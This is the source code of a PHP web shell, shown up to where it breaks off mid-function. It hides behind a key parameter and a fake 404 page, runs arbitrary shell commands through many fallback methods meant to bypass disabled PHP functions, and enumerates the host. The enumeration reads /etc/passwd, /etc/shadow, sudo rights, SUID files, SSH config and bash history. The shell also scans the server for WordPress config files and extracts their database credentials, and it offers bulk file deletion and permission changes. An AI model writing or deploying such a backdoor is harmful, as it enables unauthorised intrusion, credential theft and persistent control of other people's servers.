<?php
const AL_SHELL_KEY = 'al';
if (!isset($_GET['masuk']) || $_GET['masuk'] !== AL_SHELL_KEY) {
    if (isset($_GET['al']) && $_GET['al'] === 'here') {
        exit('welcome');
    }
    http_response_code(404);
    exit('404 Not Found');
}
if (isset($_GET['action']) && $_GET['action'] === 'perform_search') {
    header('Content-Type: text/html; charset=utf-8');
    $searchTerm = $_POST['search_term'] ?? '';
    $searchType = $_POST['search_type'] ?? 'filename';
    $searchFromRoot = isset($_POST['search_root']);
    $searchDir = $_POST['d'] ?? getcwd();
    if (empty($searchTerm)) {
        echo '<pre>Please enter a search term.</pre>';
        exit;
    }
    if ($searchFromRoot) {
        chdir('/');
    } else {
        chdir($searchDir);
    }
    $results = '';
    if ($searchType === 'filename') {
        $command = "find . -iname " . escapeshellarg("*$searchTerm*") . " 2>/dev/null";
        $results = execute_shell_command($command);
        if (empty(trim($results)) || strpos($results, 'Error:') === 0) {
            $results = "No files or directories found matching '" . htmlspecialchars($searchTerm) . "'";
        }
    } elseif ($searchType === 'content') {
        $command = "grep -Rin " . escapeshellarg($searchTerm) . " . 2>/dev/null";
        $results = execute_shell_command($command);
        if (empty(trim($results)) || strpos($results, 'Error:') === 0) {
            $results = "No files found containing the string '" . htmlspecialchars($searchTerm) . "'";
        }
    }
    echo "<pre>" . htmlspecialchars($results) . "</pre>";
    exit;
}
if (isset($_GET['action']) && $_GET['action'] === 'get_server_info') {
    header('Content-Type: text/html; charset=utf-8');
    echo get_detailed_server_info();
    exit;
}

// 🔥 SAFE JSON RESPONSE HELPERS
function safe_json_output($data) {
    header('Content-Type: application/json');
    $json = json_encode($data);
    if ($json === false) {
        // Fallback jika JSON encoding gagal
        echo json_encode([
            'success' => false,
            'error' => 'JSON encoding failed: ' . json_last_error_msg(),
            'raw_data_type' => gettype($data)
        ]);
    } else {
        echo $json;
    }
    exit;
}

function safe_json_error($message, $details = '') {
    safe_json_output([
        'success' => false,
        'error' => $message,
        'details' => $details,
        'timestamp' => date('Y-m-d H:i:s')
    ]);
}

// Check if function is available and not disabled
function is_function_available($func) {
    return function_exists($func) && !in_array($func, explode(',', ini_get('disable_functions')));
}

// Check if command can be executed
function check_execution_environment() {
    $issues = [];
    
    // Check PHP functions
    $required_funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open'];
    $available_funcs = [];
    foreach ($required_funcs as $func) {
        if (is_function_available($func)) {
            $available_funcs[] = $func;
        }
    }
    
    if (empty($available_funcs)) {
        $issues[] = 'No shell execution functions available. Check disable_functions in php.ini';
    }
    
    // Check safe mode (deprecated but still used)
    if (ini_get('safe_mode')) {
        $issues[] = 'PHP Safe Mode is enabled';
    }
    
    // Check SELinux
    if (file_exists('/sys/fs/selinux/enforce')) {
        $selinux = @file_get_contents('/sys/fs/selinux/enforce');
        if (trim($selinux) === '1') {
            $issues[] = 'SELinux is enforcing (may block commands)';
        }
    }
    
    return [
        'available_functions' => $available_funcs,
        'issues' => $issues,
        'can_execute' => !empty($available_funcs)
    ];
}

function scan_for_files($dir, $patterns, &$found_paths, &$results, $current_depth, $max_depth, $extractTitle) {
    if ($current_depth > $max_depth) return;
    if (!is_readable($dir)) return;
    foreach ($patterns as $pattern) {
        $files = glob($dir . '/' . $pattern, GLOB_NOSORT);
        if ($files) {
            foreach ($files as $file) {
                if (!is_file($file)) continue;
                $path = dirname($file);
                if (in_array($path, $found_paths)) continue;
                $found_paths[] = $path;
                $result = analyze_file_match($path, basename($file), $extractTitle);
                $results[] = $result;
            }
        }
    }
    if ($current_depth < $max_depth) {
        try {
            $subdirs = glob($dir . '/*', GLOB_ONLYDIR);
            if (!$subdirs) return;
            foreach ($subdirs as $subdir) {
                $basename = basename($subdir);
                if (in_array($basename, ['proc', 'sys', 'dev', 'run', 'boot', 'lost+found', 'tmp', 'temp'])) continue;
                scan_for_files($subdir, $patterns, $found_paths, $results, $current_depth + 1, $max_depth, $extractTitle);
            }
        } catch (Exception $e) {
            return;
        }
    }
}
function scan_for_content($dir, $patterns, &$found_files, &$results, $current_depth, $max_depth, $showPreview, $max_file_size, $file_extensions) {
    if ($current_depth > $max_depth) return;
    if (!is_readable($dir)) return;
    try {
        $files = glob($dir . '/*');
        if (!$files) return;
        foreach ($files as $file) {
            if (is_dir($file)) {
                $basename = basename($file);
                if (in_array($basename, ['proc', 'sys', 'dev', 'run', 'boot', 'lost+found', 'tmp', 'temp'])) continue;
                scan_for_content($file, $patterns, $found_files, $results, $current_depth + 1, $max_depth, $showPreview, $max_file_size, $file_extensions);
            } elseif (is_file($file)) {
                if (filesize($file) > $max_file_size) continue;
                $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                if (!in_array($ext, $file_extensions)) continue;
                if (in_array($file, $found_files)) continue;
                $found_files[] = $file;
                $content = @file_get_contents($file, false, null, 0, 50000); // Baca max 50KB
                if (!$content) continue;
                $matches = [];
                foreach ($patterns as $pattern) {
                    if (stripos($content, $pattern) !== false) {
                        $context = '';
                        if ($showPreview) {
                            $pos = stripos($content, $pattern);
                            $start = max(0, $pos - 100);
                            $len = min(200, strlen($content) - $start);
                            $context = substr($content, $start, $len);
                            $context = str_replace($pattern, "**{$pattern}**", $context);
                        }
                        $matches[] = ['pattern' => $pattern, 'context' => $context];
                    }
                }
                if (!empty($matches)) {
                    $results[] = [
                        'path' => $file,
                        'type' => 'Content Match',
                        'size' => format_bytes(filesize($file)),
                        'writable' => is_writable($file),
                        'matches' => $matches,
                        'preview' => $showPreview
                    ];
                }
            }
        }
    } catch (Exception $e) {
        return;
    }
}
function format_bytes($bytes) {
    if ($bytes === 0) return '0 B';
    $k = 1024;
    $sizes = ['B', 'KB', 'MB', 'GB'];
    $i = floor(log($bytes) / log($k));
    return round($bytes / pow($k, $i), 2) . ' ' . $sizes[$i];
}
function get_dir_size($dir) {
    $size = 0;
    if (!is_dir($dir) || !is_readable($dir)) {
        return '0 B';
    }
    try {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $size += $file->getSize();
            }
        }
    } catch (Exception $e) {
        return '0 B';
    }
    return format_bytes($size);
}
function analyze_file_match($path, $marker, $extractTitle) {
    $result = [
        'path' => $path,
        'type' => 'Unknown',
        'marker' => $marker,
        'writable' => is_writable($path),
        'size' => get_dir_size($path),
        'has_title' => false,
        'title' => null
    ];
    if (file_exists($path . '/wp-config.php')) {
        $result['type'] = 'WordPress';
    } elseif (file_exists($path . '/configuration.php')) {
        $result['type'] = 'Joomla';
    } elseif (file_exists($path . '/app/Mage.php')) {
        $result['type'] = 'Magento';
    } elseif (file_exists($path . '/sites/default/settings.php')) {
        $result['type'] = 'Drupal';
    } elseif (glob($path . '/*.php')) {
        $result['type'] = 'PHP Site';
    } elseif (glob($path . '/*.html') || glob($path . '/*.htm')) {
        $result['type'] = 'Static HTML';
    }
    if ($extractTitle) {
        foreach (['index.php', 'index.html', 'index.htm'] as $index) {
            $index_file = $path . '/' . $index;
            if (file_exists($index_file)) {
                $title = extract_website_title($index_file);
                if ($title) {
                    $result['title'] = $title;
                    $result['has_title'] = true;
                }
                break;
            }
        }
    }
    return $result;
}
function extract_website_title($file_path) {
    $content = @file_get_contents($file_path, false, null, 0, 5000);
    if (!$content) return null;
    if (preg_match('/<title[^>]*>([^<]+)<\/title>/i', $content, $matches)) {
        $title = trim($matches[1]);
        if (strlen($title) > 2 && strlen($title) < 150) {
            return $title;
        }
    }
    if (preg_match('/<meta[^>]*name=["\']title["\'][^>]*content=["\']([^"\']+)["\']/i', $content, $matches)) {
        $title = trim($matches[1]);
        if (strlen($title) > 2 && strlen($title) < 150) {
            return $title;
        }
    }
    return null;
}
function find_wp_configs() {
    $configs = [];
    $found_paths = []; // Track found paths to avoid duplicates
    function get_parent_dir($path, $levels) {
        $parent = $path;
        for ($i = 0; $i < $levels; $i++) {
            $new_parent = dirname($parent);
            if ($new_parent === $parent || $new_parent === '/' || empty($new_parent)) {
                return false;
            }
            $parent = $new_parent;
        }
        return $parent;
    }
    $current_dir = getcwd();
    $traversal_paths = [$current_dir];
    for ($i = 1; $i <= 10; $i++) {
        $parent_dir = get_parent_dir($current_dir, $i);
        if ($parent_dir === false) break;
        $traversal_paths[] = $parent_dir;
        $wp_config_path = $parent_dir . DIRECTORY_SEPARATOR . 'wp-config.php';
        if (@file_exists($wp_config_path) && !in_array($wp_config_path, $found_paths)) {
            $content = @file_get_contents($wp_config_path);
            if ($content && strpos($content, 'DB_NAME') !== false) {
                $config = parse_wp_config($content, $wp_config_path);
                if ($config) {
                    $configs[] = $config;
                    $found_paths[] = $wp_config_path;
                }
            }
        }
        $common_subdirs = array('wordpress', 'wp', 'html', 'public_html', 'www', 'web', 'site');
        foreach ($common_subdirs as $subdir) {
            $subdir_path = $parent_dir . DIRECTORY_SEPARATOR . $subdir . DIRECTORY_SEPARATOR . 'wp-config.php';
            if (@file_exists($subdir_path) && !in_array($subdir_path, $found_paths)) {
                $content = @file_get_contents($subdir_path);
                if ($content && strpos($content, 'DB_NAME') !== false) {
                    $config = parse_wp_config($content, $subdir_path);
                    if ($config) {
                        $configs[] = $config;
                        $found_paths[] = $subdir_path;
                    }
                }
            }
        }
    }
    $common_locations = array(
        '/var/www/html/wp-config.php',
        '/var/www/wordpress/wp-config.php',
        '/var/www/wp-config.php',
        '/var/www/html/wordpress/wp-config.php',
        '/home/www/wp-config.php',
        '/home/wordpress/wp-config.php',
        '/usr/share/wordpress/wp-config.php',
        '/opt/wordpress/wp-config.php',
        '/srv/www/wp-config.php'
    );
    foreach ($common_locations as $wp_config_path) {
        if (@file_exists($wp_config_path) && !in_array($wp_config_path, $found_paths)) {
            $content = @file_get_contents($wp_config_path);
            if ($content && strpos($content, 'DB_NAME') !== false) {
                $config = parse_wp_config($content, $wp_config_path);
                if ($config) {
                    $configs[] = $config;
                    $found_paths[] = $wp_config_path;
                }
            }
        }
    }
    $searched_paths = array_unique(array_merge(
        array('/var/www', '/home', '/opt', '/usr/share', '/srv', '/data'),
        $traversal_paths
    ));
    foreach ($searched_paths as $base_path) {
        if (!@is_dir($base_path)) continue;
        try {
            $dir_iterator = new RecursiveDirectoryIterator($base_path, RecursiveDirectoryIterator::SKIP_DOTS);
            $iterator = new RecursiveIteratorIterator($dir_iterator, RecursiveIteratorIterator::SELF_FIRST);
            $count = 0;
            foreach ($iterator as $file) {
                if ($count > 300) break;
                if ($iterator->getDepth() > 2) continue; // Limit depth
                if ($file->isFile() && $file->getFilename() === 'wp-config.php') {
                    $filepath = $file->getPathname();
                    if (in_array($filepath, $found_paths)) continue;
                    $content = @file_get_contents($filepath);
                    if ($content && strpos($content, 'DB_NAME') !== false) {
                        $config = parse_wp_config($content, $filepath);
                        if ($config) {
                            $configs[] = $config;
                            $found_paths[] = $filepath;
                        }
                    }
                }
                $count++;
            }
        } catch (Exception $e) {
            continue;
        }
    }
    return $configs;
}
function parse_wp_config($content, $filepath) {
    $config = [
        'filepath' => $filepath,
        'db_host' => 'localhost',
        'db_port' => 3306,
        'db_name' => '',
        'db_user' => '',
        'db_pass' => '',
        'table_prefix' => 'wp_'
    ];
    if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $config['db_name'] = $matches[1];
    }
    if (preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $config['db_user'] = $matches[1];
    }
    if (preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $config['db_pass'] = $matches[1];
    }
    if (preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $matches)) {
        $host_port = $matches[1];
        if (strpos($host_port, ':') !== false) {
            list($config['db_host'], $config['db_port']) = explode(':', $host_port);
        } else {
            $config['db_host'] = $host_port;
        }
    }
    if (preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]/', $content, $matches)) {
        $config['table_prefix'] = $matches[1];
    }
    return $config;
}
if (isset($_POST['action']) && $_POST['action'] === 'navigate_to_dir' && !empty($_POST['target_dir'])) {
    $targetDir = $_POST['target_dir'];
    if (is_dir($targetDir)) {
        header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($targetDir));
        exit;
    } else {
        $output = "Directory does not exist: " . htmlspecialchars($targetDir);
    }
}
header("X-Robots-Tag: noindex, nofollow", true);
header("Content-Type: text/html; charset=utf-8");
 $dir = $_GET['d'] ?? getcwd();
 $dir = rtrim($dir, '/\\');
 $output = '';
 $renameTarget = $_POST['rename_target'] ?? null;
 $server_info = php_uname('a');
 $software_info = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
 $php_version = phpversion();
 $server_ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']);
 $default_dir = getcwd();
function generate_breadcrumbs($path) {
    global $default_dir;
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $breadcrumbs = '<a href="?masuk=' . AL_SHELL_KEY . '&d=/">Root</a> / ';
    $current_path = '';
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current_path .= DIRECTORY_SEPARATOR . $part;
        $breadcrumbs .= '<a href="?masuk=' . AL_SHELL_KEY . '&d=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a> / ';
    }
    $breadcrumbs .= '<a href="?masuk=' . AL_SHELL_KEY . '&d=' . urlencode($default_dir) . '" title="Return to default directory">[Default]</a>';
    return rtrim($breadcrumbs, ' / ');
}

// Multi-method shell execution function - bypass disable_functions
function execute_shell_command($cmd) {
    $cmd = trim($cmd);
    if (empty($cmd)) return "Error: Empty command";
    
    $output = "";
    $methods_tried = [];
    
    // Method 1: shell_exec
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "shell_exec";
        $output = @shell_exec($cmd . " 2>&1");
        if ($output !== null && $output !== false) {
            return $output;
        }
    }
    
    // Method 2: exec
    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "exec";
        $output_arr = [];
        @exec($cmd . " 2>&1", $output_arr, $return_code);
        if (!empty($output_arr)) {
            return implode("\n", $output_arr);
        }
    }
    
    // Method 3: system
    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "system";
        ob_start();
        @system($cmd . " 2>&1", $return_code);
        $output = ob_get_clean();
        if (!empty($output)) {
            return $output;
        }
    }
    
    // Method 4: passthru
    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "passthru";
        ob_start();
        @passthru($cmd . " 2>&1", $return_code);
        $output = ob_get_clean();
        if (!empty($output)) {
            return $output;
        }
    }
    
    // Method 5: proc_open (most reliable alternative)
    if (function_exists('proc_open') && !in_array('proc_open', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "proc_open";
        $descriptors = [
            0 => ["pipe", "r"],  // stdin
            1 => ["pipe", "w"],  // stdout
            2 => ["pipe", "w"]   // stderr
        ];
        $process = @proc_open($cmd, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            $output = $stdout . ($stderr ? "\nSTDERR:\n" . $stderr : "");
            if (!empty($output)) {
                return $output;
            }
        }
    }
    
    // Method 6: popen
    if (function_exists('popen') && !in_array('popen', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "popen";
        $handle = @popen($cmd . " 2>&1", 'r');
        if ($handle) {
            $output = "";
            while (!feof($handle)) {
                $output .= fread($handle, 4096);
            }
            pclose($handle);
            if (!empty($output)) {
                return $output;
            }
        }
    }
    
    // Method 7: Backticks (if not disabled)
    if (!in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        try {
            $methods_tried[] = "backticks";
            $output = @eval("return `$cmd 2>&1`;");
            if (!empty($output)) {
                return $output;
            }
        } catch (Exception $e) {
            // Backticks failed
        }
    }
    
    // Method 8: pcntl_exec (CLI only, rarely available)
    if (function_exists('pcntl_exec') && !in_array('pcntl_exec', explode(',', ini_get('disable_functions')))) {
        $methods_tried[] = "pcntl_exec";
        $tmpfile = tempnam(sys_get_temp_dir(), 'sh');
        file_put_contents($tmpfile, "#!/bin/sh\n" . $cmd . " 2>&1");
        chmod($tmpfile, 0755);
        
        $descriptors = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        $process = @proc_open($tmpfile, $descriptors, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            @unlink($tmpfile);
            if (!empty($output)) {
                return $output;
            }
        }
        @unlink($tmpfile);
    }
    
    // If all methods failed, try alternative approaches
    
    // Method 9: Try using Perl if available
    if (is_function_available('perl')) {
        $methods_tried[] = "perl";
        $tmpfile = tempnam(sys_get_temp_dir(), 'pl');
        file_put_contents($tmpfile, '#!/usr/bin/perl
print `' . $cmd . ' 2>&1`;
');
        $output = @shell_exec("perl " . escapeshellarg($tmpfile) . " 2>&1");
        @unlink($tmpfile);
        if (!empty($output)) {
            return $output;
        }
    }
    
    // Method 10: Try using Python if available
    if (is_function_available('python') || is_function_available('python3')) {
        $methods_tried[] = "python";
        $py = is_function_available('python3') ? 'python3' : 'python';
        $tmpfile = tempnam(sys_get_temp_dir(), 'py');
        file_put_contents($tmpfile, 'import subprocess; print(subprocess.check_output("' . addslashes($cmd) . '", shell=True, stderr=subprocess.STDOUT).decode())');
        $output = @shell_exec($py . " " . escapeshellarg($tmpfile) . " 2>&1");
        @unlink($tmpfile);
        if (!empty($output) && strpos($output, 'Error') === false) {
            return $output;
        }
    }
    
    // If all methods failed
    $disabled_funcs = ini_get('disable_functions');
    return "Error: All shell execution methods failed or are disabled.\n\nMethods tried: " . implode(", ", $methods_tried) . "\nDisabled functions: " . ($disabled_funcs ? $disabled_funcs : "None listed in disable_functions") . "\n\nPossible solutions:\n1. Use PHP file functions for basic operations\n2. Try using SQL queries if database is available\n3. Look for other entry points (cron, scheduled tasks)\n4. Check for bypass techniques specific to this server\n5. Consider using alternative shells (Perl, Python, etc.)";
}

// Helper function to filter command output for server info
function filter_command_output($output) {
    if (empty($output)) return "-";
    
    // Check if output is error message about disabled functions
    if (strpos($output, 'All shell execution methods failed') !== false ||
        strpos($output, 'are disabled') !== false) {
        return "-"; // Return simple dash for disabled functions
    }
    
    $lines = explode("\n", $output);
    $filtered = [];
    $skip_patterns = [
        '/Permission denied/i',
        '/No such file or directory/i',
        '/cannot access/i',
        '/not accessible/i',
        '/Operation not permitted/i',
        '/Input\/output error/i',
        '/Invalid argument/i'
    ];
    
    foreach ($lines as $line) {
        $skip = false;
        foreach ($skip_patterns as $pattern) {
            if (preg_match($pattern, $line)) {
                $skip = true;
                break;
            }
        }
        if (!$skip) {
            $filtered[] = $line;
        }
    }
    
    $result = implode("\n", $filtered);
    return $result ?: "-";
}

function get_detailed_server_info() {
    $info = "";
    $info .= "<div class='info-group'><strong title='Shows detailed kernel and OS information.'>Kernel Info:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("uname -a && echo '[+] Dmesg (last 20 lines):' && dmesg 2>/dev/null | tail -n 20"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all configurable kernel variables.'>Sysctl Variables:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("sysctl -a 2>/dev/null | head -n 50"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Current user identity and group ID.'>User & ID:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("whoami && id"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows commands the current user can run with sudo.'>Sudo Rights:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("sudo -l 2>/dev/null || echo 'Sudo not accessible or no rights.'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='List of all users on the system.'>/etc/passwd:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat /etc/passwd 2>/dev/null || echo 'Cannot read /etc/passwd'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='List of all groups on the system.'>/etc/group:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat /etc/group 2>/dev/null || echo 'Cannot read /etc/group'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Attempts to read the password hash file (usually fails, but worth a try).'>/etc/shadow:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat /etc/shadow 2>/dev/null || echo 'Cannot read /etc/shadow.'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Network interface configuration and IP addresses.'>Network Interfaces:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ip a 2>/dev/null || ifconfig 2>/dev/null || echo 'No network info available'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows active TCP/UDP connections and open ports.'>Active Connections:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null || echo 'No socket info available'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='ARP table to see IP to MAC address mapping.'>ARP Table:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("arp -a 2>/dev/null || ip neigh 2>/dev/null || echo 'No ARP info'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Kernel routing table.'>Routing Table:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("route -n 2>/dev/null || ip route 2>/dev/null || echo 'No routing info'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all running processes.'>Running Processes:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ps aux 2>/dev/null | head -50"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows a snapshot of CPU and memory usage.'>Top Snapshot:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("top -bn1 2>/dev/null | head -30"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows running services (if using systemd).'>Running Services (systemd):</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -20 || echo 'systemctl not found.'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='View current user\'s crontab.'>User Crontab:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("crontab -l 2>/dev/null || echo 'No crontab for this user.'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds all cron files on the system.'>System Crons:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /etc/cron* /var/spool/cron 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Disk usage on all filesystems.'>Disk Usage:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("df -h 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Shows all mounted filesystems.'>Mounted Filesystems:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("mount 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files with SUID bit. If exploited, can give root access.'>SUID Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /usr /bin /sbin /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files with SGID bit.'>SGID Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /usr /bin /sbin /usr/bin /usr/sbin -perm -2000 -type f 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Finds files writable by anyone.'>World-Writable Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /tmp /var/tmp -writable -type f 2>/dev/null | head -n 20"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='PHP version and configuration.'>PHP Config:</strong><pre>Disable Functions: " . htmlspecialchars(ini_get('disable_functions')) . "\nPHP INI Path: " . htmlspecialchars(php_ini_loaded_file() ?: 'Unknown') . "\n" . htmlspecialchars(filter_command_output(execute_shell_command("php -i 2>/dev/null | grep 'Configuration File'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for common software versions on the server.'>Software Versions:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("python --version 2>&1; python3 --version 2>&1; perl -v 2>/dev/null | head -n 2; ruby -v 2>&1; gcc --version 2>/dev/null | head -n 1; nginx -v 2>&1; apache2 -v 2>&1 || httpd -v 2>&1"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Lists other users\' home directories.'>/home Directories:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /home/ 2>/dev/null"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Attempts to list the root directory.'>/root Directory:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /root/ 2>/dev/null || echo 'Cannot access /root.'"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Views SSH configuration.'>SSH Config:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("ls -la /etc/ssh/ 2>/dev/null; echo '---'; cat /etc/ssh/sshd_config 2>/dev/null | head -50"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for interesting configuration files.'>Config Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /etc /usr/local/etc -type f -name '*.conf' 2>/dev/null | head -n 20"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Searches for files containing keywords like password.'>Password Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("find /etc -type f \( -name '*.pwd' -o -name '*password*' \) 2>/dev/null | head -n 20"))) . "</pre></div>";
    $info .= "<div class='info-group'><strong title='Views user shell command history.'>History Files:</strong><pre>" . htmlspecialchars(filter_command_output(execute_shell_command("cat ~/.bash_history 2>/dev/null | tail -50; echo '--'; cat ~/.nano_history 2>/dev/null | tail -20"))) . "</pre></div>";
    return $info;
}
if (isset($_POST['action']) && $_POST['action'] === 'chmod') {
    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['chmod_target']);
    $permission = $_POST['chmod_perm'];
    $recursive = isset($_POST['chmod_recursive']) ? '-R' : '';
    if (is_dir($targetFile) && empty($recursive)) {
        $command = "chmod " . escapeshellarg($permission) . " " . escapeshellarg($targetFile);
    } else {
        $command = "chmod " . $recursive . " " . escapeshellarg($permission) . " " . escapeshellarg($targetFile);
    }
    execute_shell_command($command);
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'zip_selected' && !empty($_POST['selected_files'])) {
    $zipName = 'archive_' . date('Y-m-d_H-i-s') . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($dir . DIRECTORY_SEPARATOR . $zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        foreach ($_POST['selected_files'] as $file) {
            $filePath = $dir . DIRECTORY_SEPARATOR . basename($file);
            if (is_file($filePath)) {
                $zip->addFile($filePath, basename($filePath));
            } elseif (is_dir($filePath)) {
                $zip->addEmptyDir(basename($filePath));
                $baseDir = basename($filePath);
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($filePath), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($iterator as $fileInfo) {
                    if ($fileInfo->isDot()) continue;
                    // Get relative path from inner iterator
                    $subPath = $iterator->getInnerIterator()->getSubPathname();
                    $localPath = $baseDir . '/' . $subPath;
                    if ($fileInfo->isDir()) {
                        $zip->addEmptyDir($localPath);
                    } else {
                        $zip->addFile($fileInfo->getRealPath(), $localPath);
                    }
                }
            }
        }
        $zip->close();
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'delete_selected' && !empty($_POST['selected_files'])) {
    foreach ($_POST['selected_files'] as $file) {
        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($file);
        if (is_dir($targetPath)) {
            @rmdir_recursive($targetPath);
        } else {
            @unlink($targetPath);
        }
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'chmod_bulk' && !empty($_POST['selected_files'])) {
    header('Content-Type: application/json');
    $permission = $_POST['chmod_perm'] ?? '644';
    $recursive = isset($_POST['chmod_recursive']) && $_POST['chmod_recursive'] === '1';
    
    $results = [
        'success' => true,
        'total' => 0,
        'success_count' => 0,
        'failed_count' => 0,
        'processed' => [],
        'errors' => []
    ];
    
    // Function to recursively chmod
    function chmod_recursive($path, $permission, &$results) {
        global $dir;
        if (!file_exists($path)) {
            $results['errors'][] = 'Not found: ' . $path;
            $results['failed_count']++;
            return false;
        }
        
        $success = @chmod($path, octdec($permission));
        $parentDir = dirname($path);
        $results['processed'][] = [
            'path' => $path,
            'name' => basename($path),
            'dir' => $parentDir,
            'type' => is_dir($path) ? 'dir' : 'file',
            'success' => $success
        ];
        
        if ($success) {
            $results['success_count']++;
        } else {
            $results['errors'][] = 'Failed: ' . $path;
            $results['failed_count']++;
        }
        $results['total']++;
        
        // If directory and recursive, process children
